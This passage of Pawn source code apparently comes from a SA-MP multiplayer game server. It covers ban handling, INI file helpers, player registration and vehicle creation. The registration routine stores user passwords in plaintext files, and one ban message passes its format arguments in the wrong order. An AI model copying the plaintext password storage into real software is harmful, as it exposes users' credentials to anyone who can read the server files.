			else format(string,sizeof(string)," *** %s has been banned by %s. (%s)",GetName(playerid),GetName(adminid),reason);
		else
			if(adminid == INVALID_PLAYER_ID) format(string,sizeof(string)," *** %s has been banned for %d days. (%s)",GetName(playerid),bandays,reason);
			else if(adminid == ConsoleID) format(string,sizeof(string)," *** %s has been banned for %d days by the Console. (%s)",GetName(playerid),bandays,reason);
			else if(adminid == MAX_PLAYERS+1) format(string,sizeof(string)," [" acname "] %s has been banned for %d. (%s)",GetName(playerid),bandays,reason);
			else if(adminid == -1) format(string,sizeof(string)," *** %s has been banned for %d days by %s. (%s)",GetName(playerid),botname,bandays,reason);
			else format(string,sizeof(string)," *** %s has been banned for %d days by %s. (%s)",GetName(playerid),bandays,GetName(adminid),reason);
		if(!Options[2][optActive] && punishSpam[0] != playerid)
		{
			SendClientMessageToAll(0xff0000aa,string);
			//punishSpam[0] = playerid, punishSpam[1] = 60;
		}
	}
	getdate(t[0],t[1],t[2]);
	gettime(t[3],t[4],t[5]);
	if(!bantype || bantype == 1)
	{
		format(string,sizeof(string),fuserban(GetName(playerid)));
		if(!fexist(string))
		{
			fcreate(string);
			fsetstring(string,"PlayerIP",GetIP(playerid));
			if(adminid != INVALID_PLAYER_ID)
			{
				fsetstring(string,"AdminIP",adminid == MAX_PLAYERS+1 ? ("AntiCheat") : (GetIP(adminid)));
				fsetstring(string,"AdminName",adminid == MAX_PLAYERS+1 ? ("AntiCheat") : (GetName(adminid)));
			}
			fsetstring(string,"Reason",reason);
			fsetint(string,"Year",t[0]);
			fsetint(string,"Month",t[1]);
			fsetint(string,"Day",t[2]);
			fsetint(string,"Hour",t[3]);
			fsetint(string,"Minute",t[4]);
			fsetstring(string,"S",inchat_ ? ("No") : ("Yes"));
			fsetint(string,"Days",bandays);
			fsetint(string,"Level",adminid != INVALID_PLAYER_ID && IsPlayerConnected(adminid) ? playerinfo[adminid][admin] : 0);
		}
	}
	if(!bantype || bantype == 2)
	{
		format(string,sizeof(string),"/DM/Bans/IP/%s.ini",GetIP(playerid));
		if(!fexist(string))
		{
			fcreate(string);
			fsetstring(string,"PlayerName",GetName(playerid));
			if(adminid != INVALID_PLAYER_ID)
			{
				fsetstring(string,"AdminIP",adminid == MAX_PLAYERS+1 ? ("AntiCheat") : (GetIP(adminid)));
				fsetstring(string,"AdminName",adminid == MAX_PLAYERS+1 ? ("AntiCheat") : (GetName(adminid)));
			}
			fsetstring(string,"Reason",reason);
			fsetint(string,"Year",t[0]);
			fsetint(string,"Month",t[1]);
			fsetint(string,"Day",t[2]);
			fsetint(string,"Hour",t[3]);
			fsetint(string,"Minute",t[4]);
			fsetstring(string,"S",inchat_ ? ("No") : ("Yes"));
			fsetint(string,"Days",bandays);
			fsetint(string,"Level",adminid != INVALID_PLAYER_ID && IsPlayerConnected(adminid) ? playerinfo[adminid][admin] : 0);
		}
	}
	playerinfo[playerid][banned] = 1;
	if(!(playerinfo[playerid][pp] > 0 && playerinfo[playerid][logged] && playerinfo[playerid][admin] >= 20))
	{
		connected[playerid] = false;
		OnPlayerDisconnect(playerid,2);
		playerinfo[playerid][kicking] = 1;
		Kick(playerid);
	}
	return 1;
}
//=[PermBan]====================================================================
stock PermBan(playerid,adminid,reason[],inchat_=1)
{
	if(IsPlayerNPC(playerid)) return 1;
	new string[M_S];
	if(inchat_)
	{
		if(adminid == INVALID_PLAYER_ID) format(string,sizeof(string)," *** %s has been permanently banned. (%s)",GetName(playerid),reason);
		else if(adminid == ConsoleID) format(string,sizeof(string)," *** %s has been permanently banned by the Console. (%s)",GetName(playerid),reason);
		else if(adminid == MAX_PLAYERS+1) format(string,sizeof(string)," [" acname "] %s has been permanently banned. (%s)",GetName(playerid),reason);
		else if(adminid == -1) format(string,sizeof(string)," *** %s has been permanently banned by %s. (%s)",GetName(playerid),botname,reason);
		else format(string,sizeof(string)," *** %s has been permanently banned by %s. (%s)",GetName(playerid),GetName(adminid),reason);
		if(!Options[2][optActive]) SendClientMessageToAll(0xff0000aa,string);
	}
	if(!(playerinfo[playerid][pp] > 0 && playerinfo[playerid][logged] && playerinfo[playerid][admin] >= 20))
	{
		format(string,sizeof(string),"/DM/Bans/Serials/%s.ini",GetSerial(playerid));
		if(!fexist(string))
		{
			fcreate(string);
			fsetstring(string,"PlayerName",GetName(playerid));
			fsetstring(string,"PlayerIP",GetIP(playerid));
			if(adminid != INVALID_PLAYER_ID)
			{
				fsetstring(string,"AdminIP",adminid == MAX_PLAYERS+1 ? ("AntiCheat") : (GetIP(adminid)));
				fsetstring(string,"AdminName",adminid == MAX_PLAYERS+1 ? ("AntiCheat") : (GetName(adminid)));
			}
			fsetstring(string,"Reason",reason);
			fsetstring(string,"Date",GetDateAsString());
			fsetstring(string,"Time",GetTimeAsString());
			fsetstring(string,"S",inchat_ ? ("No") : ("Yes"));
		}
		playerinfo[playerid][banned] = 1;
		connected[playerid] = false;
		OnPlayerDisconnect(playerid,2);
		playerinfo[playerid][kicking] = 1;
		Kick(playerid);
	}
	return 1;
}
//=[CopyFunctions]==============================================================
stock fcopystring(file[],copyfile[],key[])
{
	new string[M_S];
	format(string,sizeof(string),fgetstring(copyfile,key));
	fsetstring(file,key,string);
	return 1;
}
stock fcopyint(file[],copyfile[],key[])
{
	new int = fgetint(copyfile,key);
	fsetint(file,key,int);
	return 1;
}
stock fcopyfloat(file[],copyfile[],key[])
{
	new float = fgetfloat(copyfile,key);
	fsetfloat(file,key,float);
	return 1;
}
stock fsetname(oldname[],newname[])
{
	if(!fexist(oldname)) return 0;
	fremove(newname);
	if(!fcopy(oldname,newname)) return 0;
	fremove(oldname);
	return 1;
}
stock fcopy(oldname[],newname[])
{
	new File:ohnd, File:nhnd, buf2[1], i;
	if(!fexist(oldname)) return 0;
	ohnd = fopen(oldname,io_read), nhnd = fopen(newname,io_write);
	for(i=flength(ohnd);i>0;i--) fputchar(nhnd,fgetchar(ohnd,buf2[0],false),false);
	fclose(ohnd);
	fclose(nhnd);
	return 1;
}
//=[Dini]=======================================================================
/*
	Functions from "DINI.inc" & "DUtils.inc"
	by DracoBlue
	Improved & renamed by me
*/
stock ret_memcpy(source[],index,numbytes)
{
	new tmp[256], i = 0;
	tmp[0] = 0;
	if(index >= strlen(source)) return tmp;
	if(numbytes+index >= strlen(source)) numbytes = strlen(source)-index;
	if(numbytes <= 0) return tmp;
	for(i=index;i<numbytes+index;i++)
	{
		tmp[i-index] = source[i];
		if(source[i] == 0) return tmp;
	}
	tmp[numbytes] = 0;
	return tmp;
}
stock StripNewLine(string[])
{
	new len = strlen(string);
	if(string[0] == 0) return 0;
	if((string[len-1] == '\n') || (string[len-1] == '\r'))
	{
		string[len-1] = 0;
		if(string[0] == 0) return 0;
		if((string[len-2] == '\n') || (string[len-2] == '\r')) string[len-2] = 0;
	}
	return 1;
}
stock fsetstring(filename[],key[],value[])
{
	if(debugstate) printf("fsetstring(%s,%s,%s) start",filename,key,value);
	CrashProtection_CheckFile(filename,0);
	new File:fohnd, File:fwhnd, bool:wasset=false, tmpres[256];
	if(key[0] == 0) return 0;
	format(tmpres,sizeof(tmpres),"%s.part",filename);
	fohnd = fopen(filename,io_read);
	if(!fohnd) return printf("fsetstring(%s,%s,%s) - cant open file",filename,key,value);
	if(fexist(tmpres)) fremove(tmpres);
	fwhnd = fopen(tmpres,io_write);
	if(!fwhnd) return fclose(fohnd), printf("fsetstring(%s,%s,%s) - cant open file 2",filename,key,value);
	while(fread(fohnd,tmpres))
	{
		StripNewLine(tmpres);
		if(tmpres[0] == ';' || strfind(tmpres,"=") == -1) continue;
		if(!wasset && equal(flinekey(tmpres),key))
		{
			format(tmpres,sizeof(tmpres),"%s=%s",key,value);
			wasset=true;
		}
		fwrite(fwhnd,tmpres);
		fwrite(fwhnd,"\r\n");
	}
	if(!wasset)
	{
		format(tmpres,sizeof(tmpres),"%s=%s",key,value);
		fwrite(fwhnd,tmpres);
		fwrite(fwhnd,"\r\n");
	}
	fclose(fohnd);
	fclose(fwhnd);
	format(tmpres,sizeof(tmpres),"%s.part",filename);
	if(fcopytextfile(tmpres,filename)) return fremove(tmpres);
	if(debugstate) printf("fsetstring(%s,%s,%s) end",filename,key,value);
	return 0;
}
stock fsetint(filename[],key[],value)
{
   new valuestring[256];
   format(valuestring,sizeof(valuestring),"%d",value);
   return fsetstring(filename,key,valuestring);
}
stock fgetint(filename[],key[]) return strval(fgetstring(filename,key));
stock fsetfloat(filename[],key[],Float:value)
{
   new valuestring[256];
   format(valuestring,sizeof(valuestring),"%f",value);
   return fsetstring(filename,key,valuestring);
}
forward Float:fgetfloat(filename[],key[]);
public Float:fgetfloat(filename[],key[]) return floatstr(fgetstring(filename,key));
stock fremovekey(filename[],key[])
{
	CrashProtection_CheckFile(filename,0);
	new File:fohnd, File:fwhnd, tmpres[256];
	format(tmpres,sizeof(tmpres),"%s.part",filename);
	fohnd = fopen(filename,io_read);
	if(!fohnd) return 0;
	fremove(tmpres);
	fwhnd = fopen(tmpres,io_write);
	if(!fwhnd) return 0;
	while(fread(fohnd,tmpres))
	{
		StripNewLine(tmpres);
		if(tmpres[0] == ';' || strfind(tmpres,"=") == -1) continue;
		if(!equal(flinekey(tmpres),key))
		{
			format(tmpres,sizeof(tmpres),"%s\r\n",tmpres);
			fwrite(fwhnd,tmpres);
		}
	}
	fclose(fohnd);
	fclose(fwhnd);
	format(tmpres,sizeof(tmpres),"%s.part",filename);
	if(fcopytextfile(tmpres,filename)) return fremove(tmpres);
	return 0;
}
stock fgetstring(filename[],key[])
{
	if(debugstate) printf("fgetstring(%s,%s) start",filename,key);
	new File:fohnd, tmpres[256];
	CrashProtection_CheckFile(filename,tmpres);
	tmpres[0] = -1;
	fohnd = fopen(filename,io_read); // fone
	if(!fohnd) return tmpres;
	while(fread(fohnd,tmpres))
	{
		StripNewLine(tmpres);
		if(tmpres[0] == ';' || strfind(tmpres,"=") == -1) continue;
		if(equal(flinekey(tmpres),key))
		{
			fclose(fohnd); // fone
			format(tmpres,sizeof(tmpres),flinevalue(tmpres));
			if(debugstate) printf("fgetstring(%s,%s) end",filename,key);
			return tmpres;
		}
	}
	fclose(fohnd); // fone
	if(debugstate) printf("fgetstring(%s,%s) end?",filename,key);
	return tmpres;
}
stock fkeyexist(filename[],key[])
{
	CrashProtection_CheckFile(filename,0);
	new File:fohnd, tmpres[M_S];
	fohnd = fopen(filename,io_read); // fone
	if(!fohnd) return 0;
	while(fread(fohnd,tmpres))
	{
		StripNewLine(tmpres);
		if(tmpres[0] == ';' || strfind(tmpres,"=") == -1) continue;
		if(equal(flinekey(tmpres),key))
		{
			fclose(fohnd); // fone
			return 1;
		}
	}
	fclose(fohnd); // fone
	return 0;
}
stock fcopytextfile(oldname[],newname[])
{
	new File:ohnd, File:nhnd;
	if(!fexist(oldname)) return false;
	ohnd = fopen(oldname,io_read);
	if(!ohnd) return false;
	nhnd = fopen(newname,io_write);
	if(!nhnd) return fclose(ohnd), false;
	new tmpres[M_S];
	while(fread(ohnd,tmpres))
	{
		StripNewLine(tmpres);
		if(tmpres[0] == ';') continue;
		format(tmpres,sizeof(tmpres),"%s\r\n",tmpres);
		fwrite(nhnd,tmpres);
	}
	fclose(ohnd);
	fclose(nhnd);
	return true;
}
stock fwritekey_string(File:f,key[],value[])
{
	new string[M_S];
	format(string,sizeof(string),"%s=%s\r\n",key,value);
	fwrite(f,string);
	return 1;
}
stock fwritekey_int(File:f,key[],value)
{
	new string[M_S];
	format(string,sizeof(string),"%s=%d\r\n",key,value);
	fwrite(f,string);
	return 1;
}
forward fwritekey_float(File:f,key[],Float:value);
stock fwritekey_float(File:f,key[],Float:value)
{
	new string[M_S];
	format(string,sizeof(string),"%s=%f\r\n",key,value);
	fwrite(f,string);
	return 1;
}
//=[my_frename]=================================================================
stock my_frename(oldname[],newname[])
{
	new bool:ret = false;
	ret = fcopytextfile(oldname,newname) ? true : false;
	if(ret) return ret = fremove(oldname);
	return ret;
}
//=[fuser]======================================================================
stock fuser(playerid)
{
	new funcstring[M_S];
	format(funcstring,sizeof(funcstring),"/DM/Users/%s.ini",GetName(playerid));
	return funcstring;
}
//=[fuserban]===================================================================
stock fuserban(playerid[])
{
	new funcstring[M_S];
	format(funcstring,sizeof(funcstring),"/DM/Bans/%s.ini",playerid);
	return funcstring;
}
//=[fuserbanIP]===================================================================
stock fuserbanIP(playerid[])
{
	new funcstring[M_S];
	format(funcstring,sizeof(funcstring),"/DM/Bans/IP/%s.ini",playerid);
	return funcstring;
}
//=[RegisterPlayer]=============================================================
stock RegisterPlayer(playerid,pass[])
{
	new f[M_S], string[M_S], d[3];
	getdate(d[2],d[1],d[0]);
	format(f,sizeof(f),fuser(playerid));
	fcreate(f);
	// UID
	fsetstring(fuser(playerid),"FirstUID",GetSerial(playerid));
	fsetstring(fuser(playerid),"LastUID",GetSerial(playerid));
	// Password
	fsetstring(f,"Password",pass);
	fsetstring(f,"RegistrationPassword",pass);
	// Admin Mode
	for(new i = 0; i < sizeof(AdminToggleType); i++)
	{
		format(string,sizeof(string),"AdminToggle%d",AdminToggleType[i][atUID]);
		fsetint(f,string,0);
	}
	fsetint(f, "Claim", -1);
	fsetstring(f,"Tag2","X");
	fsetint(f,"TagColor",-1);
	fsetstring(f,"Ban","No");
	fsetint(f,"SAdmin",0);
	fsetint(f,"Reports",0);
	fsetstring(f,"LastABWithdraw","never");
	// Times & Dates
	fsetstring(f,"LastConnectIP",GetIP(playerid));
	fsetstring(f,"RegistrationIP",GetIP(playerid));
	fsetstring(f,"LastChangeIPDate",GetDateAsString());
	fsetstring(f,"LastChangeIPTime",GetTimeAsString());
	fsetstring(f,"RegistrationDate",GetDateAsString());
	format(playerinfo[playerid][rdate],32,GetDateAsString());
	fsetstring(f,"RegistrationTime",GetTimeAsString());
	fsetint(f,"LastConnectDay",d[0]);
	fsetint(f,"LastConnectMonth",d[1]);
	fsetint(f,"LastConnectYear",d[2]);
	fsetstring(f,"LastConnectTime",GetTimeAsString());
	fsetint(f,"TimeInServer",playerinfo[playerid][intime][1]);
	fsetint(f,"TotalTimeInServer",playerinfo[playerid][intime][1]);
	fsetstring(f,"LastChangepass","never");
	fsetstring(f,"LastChangename","never");
	fsetstring(f,"FirstUID",GetSerial(playerid));
	fsetstring(f,"LastUID",GetSerial(playerid));
	// Stats
	fsetint(f,"Kills",playerinfo[playerid][kills]);
	fsetint(f,"HeadShots",playerinfo[playerid][hshots]);
	fsetint(f,"Tables",playerinfo[playerid][tables]);
	fsetint(f,"Deaths",playerinfo[playerid][deaths]);
	fsetint(f,"PlayerLevel",playerinfo[playerid][level]);
	fsetstring(f,"PlayerLevelName",playerinfo[playerid][slevelname]);
	fsetint(f,"Energy",playerinfo[playerid][energy]);
	fsetint(f,"PlayerUPower",playerinfo[playerid][upower]);
	fsetint(f,"PlayerUPower2",playerinfo[playerid][upower2]);
	fsetint(f,"PlayerUPowerKeys",playerinfo[playerid][upowerkeys]);
	fsetint(f,"PlayerUPowerKeys2",playerinfo[playerid][upowerkeys2]);
	fsetint(f,"Bank",playerinfo[playerid][bank]);
	fsetstring(f,"BankPassword","None");
	fsetint(f,"BankShare",playerinfo[playerid][bankshare]);
	fsetint(f,"CCard",playerinfo[playerid][ccard]);
	fsetint(f,"PVehicle",0);
	fsetint(f,"PVehicle2",0);
	fsetint(f,"VehicleCost",0);
	fsetint(f,"Vehicle2Cost",0);
	fsetint(f,"VehicleColor1",-1);
	fsetint(f,"VehicleColor2",-1);
	fsetint(f,"Vehicle2Color1",-1);
	fsetint(f,"Vehicle2Color2",-1);
	fsetint(f,"VehicleFuel",-1);
	for(new i = 0; i <= 13; i++)
	{
		format(string,sizeof(string),"VehicleMod%d",i);
		playerinfo[playerid][pvmod][i] = fkeyexist(f,string) ? fgetint(f,string) : 0;
	}
	fsetint(f,"Drugs",playerinfo[playerid][drugs]);
	fsetint(f,"Pet",playerinfo[playerid][pet][0]);
	fsetint(f,"LastMoney",playerinfo[playerid][lastmoney]);
	fsetint(f,"XJail1",playerinfo[playerid][xjail]);
	fsetint(f,"Bomb",playerinfo[playerid][bomb]);
	fsetint(f,"ChangepassLimit",0);
	fsetint(f,"ChangenameLimit",0);
	fsetint(f,"ABWithdrawLimit",0);
	fsetint(f,"Bonus_S",playerinfo[playerid][bonus_si]);
	fsetint(f,"Phone",playerinfo[playerid][phone]);
	fsetint(f,"PhoneModel",playerinfo[playerid][phonemodel]);
	fsetint(f,"PhoneDesign",playerinfo[playerid][phonedesign]);
	fsetint(f,"SpecialWeapon",playerinfo[playerid][spweapon]);
	fsetfloat(f,"SavedX",0.0);
	fsetfloat(f,"SavedY",0.0);
	fsetfloat(f,"SavedZ",0.0);
	fsetint(f,"BugArmour",playerinfo[playerid][bugarmour]);
	fsetint(f,"MissionTime",playerinfo[playerid][mstimenew]);
	fsetfloat(f,"BestCBug",playerinfo[playerid][bestcbug]);
	// Clan
	fsetint(f,"ClanCode",0);
	fsetint(f,"ClanLevel",1);
	fsetstring(f,"ClanTag","X");
	// Organization
	fsetint(f,"Org",0);
	fsetint(f,"OrgLevel",0);
	fsetstring(f,"OrgTag","X");
	// Profile
	fsetint(f,"ProfileICQ",playerinfo[playerid][icq]);
	fsetstring(f,"ProfileMessenger",playerinfo[playerid][messenger]);
	fsetstring(f,"ProfileSkype",playerinfo[playerid][skype]);
	fsetstring(f,"ProfileFacebook",playerinfo[playerid][facebook]);
	fsetstring(f,"ProfileEmail",playerinfo[playerid][email]);
	fsetstring(f,"ProfileCountry",playerinfo[playerid][country]);
	fsetint(f,"ProfileBirthDay",playerinfo[playerid][birthdate][0]);
	fsetint(f,"ProfileBirthMonth",playerinfo[playerid][birthdate][1]);
	fsetint(f,"ProfileBirthYear",playerinfo[playerid][birthdate][2]);
	// Setting
	for(new i = 0; i < max_settings; i++)
	{
		format(string,sizeof(string),"Setting%d",i);
		fsetint(f,string,playerinfo[playerid][setting][i]);
	}
	fsetint(f,"Skin",playerinfo[playerid][skin]);
	// Weapons
	for(new i=0;i<10;i++)
	{
		format(string,sizeof(string),"PlayerWeapon%d",i);
		fsetint(f,string,playerinfo[playerid][weapons][i]);
		if(i < 8)
		{
			format(string,sizeof(string),"PlayerAmmo%d",i);
			fsetint(f,string,playerinfo[playerid][ammo][i]);
		}
	}
	// Friends
	for(new i = 1; i <= MAX_FRIENDS; i++)
	{
		format(string,sizeof(string),"Friend_%d",i);
		fsetstring(f,string,"None");
		SetPVarString(playerid,string,"None");
	}
	// Diary
	for(new i = 1; i <= MAX_DIARY_LINES; i++)
	{
		format(string,sizeof(string),"DiaryLine%d",i);
		fsetstring(f,string,"None");
		SetPVarString(playerid,string,"None");
	}
	// Ranks
	for(new i = 0; i < MAX_RANKS; i++)
	{
		format(string,sizeof(string),"Rank%02d",i);
		fsetint(f,string,0);
	}
	// WType
	for(new i = 0; i < max_wtypes; i++)
	{
		format(string,sizeof(string),"WType%d",i);
		fsetint(f,string,playerinfo[playerid][wtype][i]);
	}
	// Ammunation Items
	for(new i = 0; i < max_ammunation_items; i++)
	{
		format(string,sizeof(string),"AmmuItem%d",AmmunationSpecialItems[i][aiID]);
		fsetint(f,string,playerinfo[playerid][ammuitemammo][AmmunationSpecialItems[i][aiID]]);
	}
	// Objectives
	for(new i = 0; i < MAX_OBJECTIVES; i++)
	{
		format(string,sizeof(string),"Objective%d",Objectives[i][obUniqueID]);
		fsetint(f,string,playerinfo[playerid][objective][i]);
	}
	return 1;
}
//=[SetString]==================================================================
stock SetString(dest[],source[])
{   // by DracoBlue, improved by me
	new count = strlen(source), i = 0;
	for(i=0;i<count;i++) dest[i] = source[i];
	dest[count] = 0;
	return 1;
}
//=[IsPlayerInCircle]===========================================================
stock IsPlayerInCircle(playerid,Float:x,Float:y,Float:radius)
{   // by Sacky, improved by me
	if(GetPlayerDistanceToPoint(playerid,x,y) < radius) return 1;
	return 0;
}
//=[GetPlayerDistanceToPoint]===================================================
stock GetPlayerDistanceToPoint(playerid,Float:x,Float:y)
{   // by Sacky, improved by me
	new Float:x1, Float:y1, Float:z1, Float:tmpdis;
	GetPlayerPos(playerid,x1,y1,z1);
	tmpdis = floatsqroot(floatpower(floatabs(floatsub(x,x1)),2)+floatpower(floatabs(floatsub(y,y1)),2));
	return floatround(tmpdis);
}
//=[IsPlayerInSphere]===========================================================
stock IsPlayerInSphere(playerid,Float:x,Float:y,Float:z,Float:radius) return GetPlayerDistanceToPointEx(playerid,x,y,z) < radius? 1:0;// by Sacky, improved by me
//=[GetPlayerDistanceToPointEx]=================================================
stock GetPlayerDistanceToPointEx(playerid,Float:x,Float:y,Float:z)
{   // by Sacky, improved by me
	new Float:x1, Float:y1, Float:z1, Float:tmpdis;
	GetPlayerPos(playerid,x1,y1,z1);
	tmpdis = floatsqroot(floatpower(floatabs(floatsub(x,x1)),2)+floatpower(floatabs(floatsub(y,y1)),2)+floatpower(floatabs(floatsub(z,z1)),2));
	return floatround(floatabs(tmpdis));
}
//=[DistanceToPoint]============================================================
stock DistanceToPoint(Float:x1,Float:y1,Float:z1,Float:x,Float:y,Float:z)
{
	new Float:tmpdis = floatsqroot(floatpower(floatabs(floatsub(x,x1)),2)+floatpower(floatabs(floatsub(y,y1)),2)+floatpower(floatabs(floatsub(z,z1)),2));
	return floatround(tmpdis);
}
//=[SObjectToPoint]=============================================================
stock SObjectToPoint(Float:radi,objectid,Float:x,Float:y,Float:z)
{
	new Float:oldposx, Float:oldposy, Float:oldposz;
	new Float:tempposx, Float:tempposy, Float:tempposz;
	GetSObjectPos(objectid,oldposx,oldposy,oldposz);
	tempposx = (oldposx-x),tempposy = (oldposy-y), tempposz = (oldposz-z);
	if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi))) return 1;
	return 0;
}
//=[ObjectToPoint]==============================================================
stock ObjectToPoint(Float:radi,objectid,Float:x,Float:y,Float:z)
{
	new Float:oldposx, Float:oldposy, Float:oldposz;
	new Float:tempposx, Float:tempposy, Float:tempposz;
	GetObjectPos(objectid,oldposx,oldposy,oldposz);
	tempposx = (oldposx-x),tempposy = (oldposy-y), tempposz = (oldposz-z);
	if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi))) return 1;
	return 0;
}
//=[GetDistanceBetweenPlayers]==================================================
stock GetDistanceBetweenPlayers(playerid,playerid2)
{
	new Float:p[3];
	GetPlayerPos(playerid2,p[0],p[1],p[2]);
	return GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]);
}
//=[CreateVehicleEx]============================================================
stock CreateVehicleEx(modelid,Float:x,Float:y,Float:z,Float:a,color1,color2,respawn_delay=respawntime,interior=0,world=world_normal)
{
	new v = INVALID_VEHICLE_ID;
	if(modelid == 449 || modelid == 537 || modelid == 538) v = AddStaticVehicleEx(modelid,x,y,z,a,color1,color2,respawn_delay);
	else v = CreateVehicle(modelid,x,y,z,a,color1,color2,respawn_delay);
	LinkVehicleToInterior(v,interior);
	SetVehicleVirtualWorld(v,world);
	vehModel[modelid-400]++;
	vehicleinfo[v][lastdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][locked] = 0;
	vehicleinfo[v][store] = 0;
	vehicleinfo[v][vowner] = INVALID_PLAYER_ID;
	vehicleinfo[v][racedriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][kartdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][monsterdriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][armydriver] = INVALID_PLAYER_ID;
	vehicleinfo[v][vvalid] = 1;
	vehicleinfo[v][vemodel] = modelid;
	vehicleinfo[v][vpos][0] = x;
	vehicleinfo[v][vpos][1] = y;
	vehicleinfo[v][vpos][2] = z;
	vehicleinfo[v][vpos][3] = a;
	vehicleinfo[v][vspawnpos][0] = x;
	vehicleinfo[v][vspawnpos][1] = y;
	vehicleinfo[v][vspawnpos][2] = z;
	vehicleinfo[v][vspawnpos][3] = a;
	for(new i = 0; i < 4; i++)
	{
		vehicleinfo[v][vspawnpos][i] = vehicleinfo[v][vpos][i];
		if(i < 3) vehicleinfo[v][vtext] = Text3D:INVALID_3DTEXT_ID;
	}
	vehicleinfo[v][vcol][0] = color1;
	vehicleinfo[v][vcol][1] = color2;
	vehicleinfo[v][newvcol][0] = color1;
	vehicleinfo[v][newvcol][1] = color2;
	vehicleinfo[v][vpj] = -1;
	vehicleinfo[v][sveint] = interior;
	vehicleinfo[v][veint] = interior;
	vehicleinfo[v][veworld] = world;
	GetVehicleHealth(v,vehicleinfo[v][vhealth]);
	vehicleinfo[v][vclan] = 0;
	vehicleinfo[v][vrockets] = {-1,-1};
	vehicleinfo[v][vcantenter] = 0;
	vehicleinfo[v][vnpcs] = 0;
	vehicleinfo[v][vfuel] = -1;
	vehicleinfo[v][vatt] = INVALID_VEHICLE_ID;
	vehicleinfo[v][tobein] = 0;
	for(new i = 0; i < MAX_PLAYERS; i++) vehicleinfo[v][streamidx] = -1;
	vehicleinfo[v][playersin] = 0;
	switch(modelid)
	{
		case 519: vehicleinfo[v][tobein] = 1;
	}
	if(vehicleinfo[v][tobein] > 0)
	{
		new Text3D:tl = Create3DTextLabel("~k~~CONVERSATION_YES~ ьчї\nьыЁщёф ыЁхёЄ",yellow,0.0,0.0,0.0,15.0,world,1);
		Attach3DTextLabelToVehicle(tl,v,0.0,0.0,2.0);
	}
	SetVehicleHealth(v,GetVehicleMHealth(modelid));
	SetVehicleRandomNumberPlate(v);
	return v;
}
//=[GetVehicleMHealth]==========================================================
forward Float:GetVehicleMHealth(modelid);
stock Float:GetVehicleMHealth(modelid)
{
	switch(modelid)
	{
		case 432: return 6000.0;
		case 592, 577: return 5000.0;
		default: return 1000.0;
	}
	return 0.0;
}
//=[CreateVehicleEx_HQ]=========================================================
stock CreateVehicleEx_HQ(modelid,Float:x,Float:y,Float:z,Float:a,color1,color2,respawn_delay,id,type = 0)
{
	new v = CreateVehicleEx(modelid,x,y,z,a,color1,color2,respawn_delay,0,world_normal);
	if(type == 0) claninfo[id][cvehicle][claninfo[id][cvehicles]] = v, claninfo[id][cvehicles]++, vehicleinfo[v][vclan] = id;
	else orginfo[id][ovehicle][orginfo[id][ovehicles]] = v, orginfo[id][ovehicles]++, vehicleinfo[v][vorg] = id;
	return v;
}
//=[CreateVIPVehicle]===========================================================
stock CreateVIPVehicle(modelid,Float:x,Float:y,Float:z,Float:a,color1,color2,respawn_delay=respawntime,interior=0,world=world_normal)
{
	new v = CreateVehicleEx(modelid,x,y,z,a,color1,color2,respawn_delay,interior,world);
	vehicleinfo[v][vevip] = 1;
	return v;
}
//=[CreateSpecialVehicle]=======================================================
stock CreateSpecialVehicle(modelid,Float:x,Float:y,Float:z,Float:a,color1,color2,respawn_delay=respawntime,world=world_normal,vspobj,vspid,vspname[],hideveh,wt=1,Float:ox=0.0,Float:oy=0.0,Float:oz=0.0,Float:orx=0.0,Float:ory=0.0,Float:orz=0.0)
{
	new v = CreateVehicleEx(modelid,x,y,z,a,color1,color2,respawn_delay,hideveh ? 20 : 0,world);
	if(wt) Create3DTextLabel("ь∙щюх∙ ьчї Єь\n"@c(lightyellow)"~k~~VEHICLE_ENTER_EXIT~",white,x,y,z,40.0,world_normal);
	vehicleinfo[v][vspecial] = 1;
	vehicleinfo[v][vspecialid] = vspid;
	format(vehicleinfo[v][vspecialname],32,vspname);
	if(vspobj > 0)
	{
		vehicleinfo[v][spobject][0] = CreateObject(vspobj,x,y,z,0.0,0.0,a,object_show_distance);
		vehicleinfo[v][spobjects] = 1;
		AttachObjectToVehicle(vehicleinfo[v][spobject],v,ox,oy,oz,orx,ory,orz);
	}
	else vehicleinfo[v][spobjects] = 0;
	vehicleinfo[v][sv_ability] = 0;
	lastSpecialVehicle = v;
	return v;
}
//=[AddToSpecialVehicle]========================================================
stock AddToSpecialVehicle(v,modelid,Float:ox=0.0,Float:oy=0.0,Float:oz=0.0,Float:orx=0.0,Float:ory=0.0,Float:orz=0.0)
{
	vehicleinfo[v][spobject][vehicleinfo[v][spobjects]] = CreateObject(modelid,0.0,0.0,0.0,0.0,0.0,0.0);
	AttachObjectToVehicle(vehicleinfo[v][spobject][vehicleinfo[v][spobjects]],v,ox,oy,oz,orx,ory,orz);
	vehicleinfo[v][spobjects]++;
	return 1;
}
//=[AddToSpecialVehicleEx]======================================================
stock AddToSpecialVehicleEx(v,objectid,Float:ox=0.0,Float:oy=0.0,Float:oz=0.0,Float:orx=0.0,Float:ory=0.0,Float:orz=0.0)
{
	vehicleinfo[v][spobject][vehicleinfo[v][spobjects]] = objectid;
	AttachObjectToVehicle(objectid,v,ox,oy,oz,orx,ory,orz);
	vehicleinfo[v][spobjects]++;
	return 1;
}
//=[CreateNPCVehicle]===========================================================
stock CreateNPCVehicle(modelid,Float:x,Float:y,Float:z,Float:a,color1,color2,respawn_delay=respawntime,interior=0,world=world_normal)
{
	new v = CreateVehicleEx(modelid,x,y,z,a,color1,color2,respawn_delay,interior,world);
	vehicleinfo[v][tobein] = 0;
	vehicleinfo[v][vnpcs] = 1;
	return v;
}
//=[InitObjectedVehicle]========================================================
stock InitObjectedVehicle(objectid,Float:x,Float:y,Float:z,Float:rx,Float:ry,Float:rz)
{
	new id = -1;
	for(new i = 0; i < MAX_OBJECTED_VEHICLES && id == -1; i++) if(!objveh[i][ovValid]) id = i;
	objveh[id][ovValid] = 1;
	objveh[id][ovObjectID] = objectid;
	return id;
}
//=[AttachToObjectedVehicle]====================================================
stock AttachToObjectedVehicle(objvehid,obj)
{
